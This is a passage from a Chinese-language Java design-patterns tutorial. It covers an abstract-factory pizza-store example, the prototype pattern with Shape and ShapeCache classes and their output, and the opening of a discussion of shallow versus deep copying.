&#123;<br>      System.out.println(<span class="hljs-string">&quot;~使用的是抽象工厂模式~&quot;</span>);<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-type">Pizza</span> <span class="hljs-variable">pizza</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>      <span class="hljs-keyword">if</span>(orderType.equals(<span class="hljs-string">&quot;cheese&quot;</span>)) &#123;<br>         pizza = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BJCheesePizza</span>();<br>      &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (orderType.equals(<span class="hljs-string">&quot;pepper&quot;</span>))&#123;<br>         pizza = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BJPepperPizza</span>();<br>      &#125;<br>      <span class="hljs-keyword">return</span> pizza;<br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>OrderPizza</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.factory.absfactory.pizzastore.order;<br><br><span class="hljs-keyword">import</span> java.io.BufferedReader;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.InputStreamReader;<br><br><span class="hljs-keyword">import</span> io.xtwoy.factory.absfactory.pizzastore.pizza.Pizza;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderPizza</span> &#123;<br><br>   AbsFactory factory;<br><br>   <span class="hljs-comment">// 构造器</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-title function_">OrderPizza</span><span class="hljs-params">(AbsFactory factory)</span> &#123;<br>      setFactory(factory);<br>   &#125;<br><br>   <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFactory</span><span class="hljs-params">(AbsFactory factory)</span> &#123;<br>      <span class="hljs-type">Pizza</span> <span class="hljs-variable">pizza</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>      <span class="hljs-type">String</span> <span class="hljs-variable">orderType</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>; <span class="hljs-comment">// 用户输入</span><br>      <span class="hljs-built_in">this</span>.factory = factory;<br>      <span class="hljs-keyword">do</span> &#123;<br>         orderType = getType();<br>         <span class="hljs-comment">// factory 可能是北京的工厂子类，也可能是伦敦的工厂子类</span><br>         pizza = factory.createPizza(orderType);<br>         <span class="hljs-keyword">if</span> (pizza != <span class="hljs-literal">null</span>) &#123; <span class="hljs-comment">// 订购ok</span><br>            pizza.prepare();<br>            pizza.bake();<br>            pizza.cut();<br>            pizza.box();<br>         &#125; <span class="hljs-keyword">else</span> &#123;<br>            System.out.println(<span class="hljs-string">&quot;订购失败&quot;</span>);<br>            <span class="hljs-keyword">break</span>;<br>         &#125;<br>      &#125; <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>);<br>   &#125;<br><br>   <span class="hljs-comment">// 写一个方法，可以获取客户希望订购的披萨种类</span><br>   <span class="hljs-keyword">private</span> String <span class="hljs-title function_">getType</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-keyword">try</span> &#123;<br>         <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">strin</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(System.in));<br>         System.out.println(<span class="hljs-string">&quot;input pizza 种类:&quot;</span>);<br>         <span class="hljs-type">String</span> <span class="hljs-variable">str</span> <span class="hljs-operator">=</span> strin.readLine();<br>         <span class="hljs-keyword">return</span> str;<br>      &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>         e.printStackTrace();<br>         <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>;<br>      &#125;<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>PizzaStore</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.factory.absfactory.pizzastore.order;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PizzaStore</span> &#123;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-comment">//new OrderPizza(new BJFactory());</span><br>      <span class="hljs-keyword">new</span> <span class="hljs-title class_">OrderPizza</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">LDFactory</span>());<br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>执行效果</p><p>input pizza 种类:<br />cheese<br /><sub>使用的是抽象工厂模式</sub><br />伦敦的奶酪pizza 准备原材料<br />伦敦的奶酪pizza baking;<br />伦敦的奶酪pizza cutting;<br />伦敦的奶酪pizza boxing;<br />input pizza 种类:</p><h1 id="原型模式"><a class="markdownIt-Anchor" href="#原型模式"></a> 原型模式</h1><p>原型模式（Prototype Pattern）是用于创建重复的对象，同时又能保证性能。这种类型的设计模式属于创建型模式，它提供了一种创建对象的最佳方式。</p><p>这种模式是实现了一个原型接口，该接口用于创建当前对象的克隆。当直接创建对象的代价比较大时，则采用这种模式。例如，一个对象需要在一个高代价的数据库操作之后被创建。我们可以缓存该对象，在下一个请求时返回它的克隆，在需要的时候更新数据库，以此来减少数据库调用。</p><h2 id="介绍-3"><a class="markdownIt-Anchor" href="#介绍-3"></a> 介绍</h2><p><strong>意图：</strong> 用原型实例指定创建对象的种类，并且通过拷贝这些原型创建新的对象。</p><p><strong>主要解决：</strong> 在运行期建立和删除原型。</p><p><strong>何时使用：</strong> 1、当一个系统应该独立于它的产品创建，构成和表示时。 2、当要实例化的类是在运行时刻指定时，例如，通过动态装载。<br />3、为了避免创建一个与产品类层次平行的工厂类层次时。<br />4、当一个类的实例只能有几个不同状态组合中的一种时。建立相应数目的原型并克隆它们可能比每次用合适的状态手工实例化该类更方便一些。</p><p><strong>如何解决：</strong> 利用已有的一个原型对象，快速地生成和原型对象一样的实例。</p><p><strong>关键代码：</strong> 1、实现克隆操作，在 JAVA 实现 Cloneable 接口，重写 clone()，在 .NET 中可以使用 Object 类的MemberwiseClone() 方法来实现对象的浅拷贝或通过序列化的方式来实现深拷贝。<br />2、原型模式同样用于隔离类对象的使用者和具体类型（易变类）之间的耦合关系，它同样要求这些&quot;易变类&quot;拥有稳定的接口。</p><p><strong>应用实例：</strong> 1、细胞分裂。 2、JAVA 中的 Object clone() 方法。</p><p><strong>优点：</strong> 1、性能提高。 2、逃避构造函数的约束。</p><p><strong>缺点：</strong><br />1、配备克隆方法需要对类的功能进行通盘考虑，这对于全新的类不是很难，但对于已有的类不一定很容易，特别当一个类引用不支持串行化的间接对象，或者引用含有循环结构的时候。<br />2、必须实现 Cloneable 接口。</p><p><strong>使用场景：</strong> 1、资源优化场景。 2、类初始化需要消化非常多的资源，这个资源包括数据、硬件资源等。 3、性能和安全要求的场景。 4、通过 new<br />产生一个对象需要非常繁琐的数据准备或访问权限，则可以使用原型模式。 5、一个对象多个修改者的场景。<br />6、一个对象需要提供给其他对象访问，而且各个调用者可能都需要修改其值时，可以考虑使用原型模式拷贝多个对象供调用者使用。<br />7、在实际项目中，原型模式很少单独出现，一般是和工厂方法模式一起出现，通过 clone 的方法创建一个对象，然后由工厂方法提供给调用者。原型模式已经与<br />Java 融为浑然一体，大家可以随手拿来使用。</p><p><strong>注意事项：</strong> 与通过对一个类进行实例化来构造新对象不同的是，原型模式是通过拷贝一个现有对象生成新对象的。浅拷贝实现<br />Cloneable，重写，深拷贝是通过实现 Serializable 读取二进制流。</p><h2 id="实现-2"><a class="markdownIt-Anchor" href="#实现-2"></a> 实现</h2><p>我们将创建一个抽象类 <em>Shape</em> 和扩展了 <em>Shape</em> 类的实体类。下一步是定义类 <em>ShapeCache</em> ，该类把 shape 对象存储在一个_Hashtable_ 中，并在请求的时候返回它们的克隆。</p><p><em>PrototypePatternDemo</em> 类使用 <em>ShapeCache</em> 类来获取 <em>Shape</em> 对象。</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/20201202-prototype-pattern.png" alt="原型模式的 UML 图" /></p><p><code>Shape</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.prototype.cn;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 创建一个实现了 Cloneable 接口的抽象类。</span><br><span class="hljs-comment"> * [io.xtwoy.prototype.cn]</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> : [席子不会敲代码]</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@version</span> : [V1.0]</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@date</span> : [2022/12/24 17:26]</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Shape</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Cloneable</span> &#123;<br><br>    <span class="hljs-keyword">private</span> String id;<br>    <span class="hljs-keyword">protected</span> String type;<br><br>    <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">draw</span><span class="hljs-params">()</span>;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getType</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> type;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getId</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> id;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setId</span><span class="hljs-params">(String id)</span> &#123;<br>        <span class="hljs-built_in">this</span>.id = id;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">clone</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">clone</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            clone = <span class="hljs-built_in">super</span>.clone();<br>        &#125; <span class="hljs-keyword">catch</span> (CloneNotSupportedException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>        <span class="hljs-keyword">return</span> clone;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>Circle</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.prototype.cn;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * [io.xtwoy.prototype.cn]</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> : [席子不会敲代码]</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@version</span> : [V1.0]</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@date</span> : [2022/12/24 17:27]</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Circle</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Shape</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Circle</span><span class="hljs-params">()</span>&#123;<br>        type = <span class="hljs-string">&quot;Circle&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">draw</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;Inside Circle::draw() method.&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>Rectangle</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.prototype.cn;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * [io.xtwoy.prototype.cn]</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> : [席子不会敲代码]</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@version</span> : [V1.0]</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@date</span> : [2022/12/24 17:27]</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Rectangle</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Shape</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Rectangle</span><span class="hljs-params">()</span>&#123;<br>        type = <span class="hljs-string">&quot;Rectangle&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">draw</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;Inside Rectangle::draw() method.&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>Square</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.prototype.cn;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * [io.xtwoy.prototype.cn]</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> : [席子不会敲代码]</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@version</span> : [V1.0]</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@date</span> : [2022/12/24 17:27]</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Square</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Shape</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Square</span><span class="hljs-params">()</span>&#123;<br>        type = <span class="hljs-string">&quot;Square&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">draw</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;Inside Square::draw() method.&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>ShapeCache</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.prototype.cn;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 创建一个类，从数据库获取实体类，并把它们存储在一个 Hashtable 中。</span><br><span class="hljs-comment"> * [io.xtwoy.prototype.cn]</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> : [席子不会敲代码]</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@version</span> : [V1.0]</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@date</span> : [2022/12/24 17:28]</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">import</span> java.util.Hashtable;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ShapeCache</span> &#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Hashtable&lt;String, Shape&gt; shapeMap<br>            = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hashtable</span>&lt;String, Shape&gt;();<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Shape <span class="hljs-title function_">getShape</span><span class="hljs-params">(String shapeId)</span> &#123;<br>        <span class="hljs-type">Shape</span> <span class="hljs-variable">cachedShape</span> <span class="hljs-operator">=</span> shapeMap.get(shapeId);<br>        <span class="hljs-keyword">return</span> (Shape) cachedShape.clone();<br>    &#125;<br><br>    <span class="hljs-comment">// 对每种形状都运行数据库查询，并创建该形状</span><br>    <span class="hljs-comment">// shapeMap.put(shapeKey, shape);</span><br>    <span class="hljs-comment">// 例如，我们要添加三种形状</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">loadCache</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">Circle</span> <span class="hljs-variable">circle</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Circle</span>();<br>        circle.setId(<span class="hljs-string">&quot;1&quot;</span>);<br>        shapeMap.put(circle.getId(),circle);<br><br>        <span class="hljs-type">Square</span> <span class="hljs-variable">square</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Square</span>();<br>        square.setId(<span class="hljs-string">&quot;2&quot;</span>);<br>        shapeMap.put(square.getId(),square);<br><br>        <span class="hljs-type">Rectangle</span> <span class="hljs-variable">rectangle</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Rectangle</span>();<br>        rectangle.setId(<span class="hljs-string">&quot;3&quot;</span>);<br>        shapeMap.put(rectangle.getId(),rectangle);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>PrototypePatternDemo</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.prototype.cn;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * PrototypePatternDemo 使用 ShapeCache 类来获取存储在 Hashtable 中的形状的克隆。</span><br><span class="hljs-comment"> * [io.xtwoy.prototype.cn]</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> : [席子不会敲代码]</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@version</span> : [V1.0]</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@date</span> : [2022/12/24 17:29]</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PrototypePatternDemo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        ShapeCache.loadCache();<br><br>        <span class="hljs-type">Shape</span> <span class="hljs-variable">clonedShape</span> <span class="hljs-operator">=</span> (Shape) ShapeCache.getShape(<span class="hljs-string">&quot;1&quot;</span>);<br>        System.out.println(<span class="hljs-string">&quot;Shape : &quot;</span> + clonedShape.getType());<br><br>        <span class="hljs-type">Shape</span> <span class="hljs-variable">clonedShape2</span> <span class="hljs-operator">=</span> (Shape) ShapeCache.getShape(<span class="hljs-string">&quot;2&quot;</span>);<br>        System.out.println(<span class="hljs-string">&quot;Shape : &quot;</span> + clonedShape2.getType());<br><br>        <span class="hljs-type">Shape</span> <span class="hljs-variable">clonedShape3</span> <span class="hljs-operator">=</span> (Shape) ShapeCache.getShape(<span class="hljs-string">&quot;3&quot;</span>);<br>        System.out.println(<span class="hljs-string">&quot;Shape : &quot;</span> + clonedShape3.getType());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>执行程序，输出结果：</p></blockquote><p>Shape : Circle<br />Shape : Square<br />Shape : Rectangle</p><h2 id="深入讨论-浅拷贝和深拷贝"><a class="markdownIt-Anchor" href="#深入讨论-浅拷贝和深拷贝"></a> 深入讨论-浅拷贝和深拷贝</h2><h3 id="浅拷贝的介绍"><a class="markdownIt-Anchor" href="#浅拷贝的介绍"></a> 浅拷贝的介绍</h3><ol><li><p>对于数据类型是基本数据类型的成员变量，浅拷贝会直接进行值传递，也就是将该属性值复制一份给新的对象。</p></li><li><p>对于数据类型是引用数据类型的成员变量，比如说成员变量是某个数组、某个类的对象等，那么浅拷贝会进行引用传递，也就是只是将该成员变量的引用值（内存地址）复制一份给新的对象。因为实际上两个对象的该成员变量都指向同一个实例。在这种情况下，在一个对象中修改该成员变量会影响到另一个对象的该成员变量值</p></li><li><p>前面我们克隆Shape 就是浅拷贝</p></li><li><p>浅拷贝是使用默认的 clone()方法来实现</p></li></ol><p>sheep = (Sheep) super.clone();</p><h3 id="深拷贝基本介绍"><a class="markdownIt-Anchor" href="#深拷贝基本介绍"></a> 深拷贝基本介绍</h3><ol><li><p>复制对象的所有基本数据类型的成员变量值</p></li><li><p>为所有引用数据类型的成员变量申请存储空间，并复制每个引用数据类型成员变量所引用的对象，直到该对象可达的所有对象。也就是说，<strong>对象进行深拷贝要对整个对象(包括对象的引用类型)进行拷贝</strong></p></li><li><p>深拷贝实现方式 1：重写 <strong>clone</strong> 方法来实现深拷贝</p></li><li><p>深拷贝实现方式 2：通过<strong>对象序列化</strong>实现深拷贝(推荐)</p></li></ol><p><code>DeepCloneableTarget</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.prototype.deepclone;<br><br><span class="hljs-keyword">import</span> java.io.Serializable;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DeepCloneableTarget</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span>, Cloneable &#123;<br>   <br>   <span class="hljs-comment">/**</span><br><span class="hljs-comment">    * </span><br><span class="hljs-comment">    */</span><br>   <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">serialVersionUID</span> <span class="hljs-operator">=</span> <span class="hljs-number">1L</span>;<br><br>   <span class="hljs-keyword">private</span> String cloneName;<br><br>   <span class="hljs-keyword">private</span> String cloneClass;<br><br>   <span class="hljs-comment">//构造器</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-title function_">DeepCloneableTarget</span><span class="hljs-params">(String cloneName, String cloneClass)</span> &#123;<br>      <span class="hljs-built_in">this</span>.cloneName = cloneName;<br>      <span class="hljs-built_in">this</span>.cloneClass = cloneClass;<br>   &#125;<br><br>   <span class="hljs-comment">//因为该类的属性，都是String , 因此我们这里使用默认的clone完成即可</span><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">protected</span> Object <span class="hljs-title function_">clone</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> CloneNotSupportedException &#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>.clone();<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>DeepProtoType</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span 